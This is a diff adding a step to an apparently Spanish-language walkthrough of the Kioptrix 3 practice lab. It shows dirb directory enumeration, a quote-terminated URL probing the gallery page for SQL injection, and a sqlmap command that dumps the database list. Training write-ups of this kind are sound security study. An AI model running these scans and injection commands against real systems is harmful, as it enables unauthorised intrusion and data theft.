@@ -59,3 +59,12 @@ dirb http://kioptrix3.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-m
 dirb http://kioptrix3.com/gallery -X .php
 ```
 ![9](https://user-images.githubusercontent.com/75953873/177896489-33c3d635-4b79-4885-959f-ee23c9f644ee.png)
+
+URL: `http://kioptrix3.com/gallery/gallery.php?id=1'`
+
+![10](https://user-images.githubusercontent.com/75953873/177896633-3865f18f-a058-4598-a58b-a8172b935124.png)
+
+- *Paso 4:* Inyección SQL con Sqlmap.
+```
+sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1'" --dbs
+```
